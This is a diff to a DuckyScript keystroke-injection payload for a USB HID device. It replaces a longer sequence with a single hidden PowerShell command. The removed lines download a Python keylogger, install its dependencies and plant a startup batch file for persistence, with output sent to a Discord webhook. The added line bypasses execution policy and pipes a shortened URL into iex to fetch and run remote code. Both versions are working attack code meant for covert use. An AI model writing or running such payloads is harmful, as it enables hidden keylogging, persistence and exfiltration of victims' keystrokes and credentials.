@@ -1,16 +1,6 @@
 DELAY 1000
 GUI R
 DELAY 300
-STRING powershell
+STRING powershell -W h -NonI -NoP -Ep bypass -c "$dc = 'your discord webhook here'; irm https://shorturl.at/blvGV | iex"
 DELAY 150
-CTRL SHIFT ENTER
-DELAY 300
-TAB
-DELAY 100
-TAB
-DELAY 200
-ENTER
-DELAY 1700
-STRING powershell -w h -NoP -NonI -Exec Bypass -c "mkdir 'C:\system32\' ; cd C:\system32\ ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile C:\system32\sys-file.py ; py -m pip install discordwebhook pynput ; '@echo off', 'start /B pythonw.exe "C:\system32\sys-file.py"' | Set-Content -Path 'C:\system32\startup.bat'
-; cp 'C:\system32\startup.bat' '$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' ; Python sys-file.py <your discord webhook here>"
 ENTER
